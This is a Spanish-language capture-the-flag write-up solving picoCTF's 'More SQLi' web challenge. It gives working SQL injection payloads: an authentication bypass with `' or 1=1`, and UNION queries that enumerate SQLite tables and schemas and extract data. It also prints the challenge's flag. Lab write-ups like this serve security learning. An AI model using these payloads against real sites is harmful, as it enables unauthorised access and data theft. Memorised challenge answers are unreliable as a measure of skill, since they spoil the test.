
## Reto
More SQLi
## Descripcion
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:64087/).

## Solucion
- al entrar me pregunta por usuario y contraseñaentonces para loggearme uso `' or 1=1 ;` en contraseña para saltarme la verificacion
- ya dentro hay algo como un buscador de ciudades en una base de datos que sigue una estructura similar a `SELECT [ALGO] FROM [TABLA] WHERE [INPUT DADO]`
- intento hacer una inyeccion poniedo esto primero: 
  `zac' union select 1,2,3;` y veo que funciona
- ahora trato de ver en que version estamos con `zac' union select sqlite_version(),2,3;` y me regresa la vercion 3.31.1
- revisando el acordeon de inyecciones proporcionados ahora uso una inyeccion para ver los nombres de todas las tablas con: 
  `' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ;`  
- y para revisar sus estructuras ahora uso: `ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ;`
  ![[Pasted image 20250924121133.png]]
<img width="824" height="722" alt="Pasted image 20250924121133" src="https://github.com/user-attachments/assets/f32969e9-5ded-4d5e-8a77-92e8fea4d627" />

  
- Ahora puedo ver que en more_table esta la bandera, entonces solo me queda que me devuelva esa informacion usando:
  ``ciudad' union select 1,2,flag from more_table;`` y obtengo la bandera: **picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}**

## Notas
- con esta y la practica de Irish-Name-Repo se puede ver que es muy importante depurar las contraseñas y usuarios para no ser victimas de una inyeccion sql que podria por terminar con alguien aplicando un `DROP TABLE`
## Referencias
[PayloadsAllTheThings/SQL Injection/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
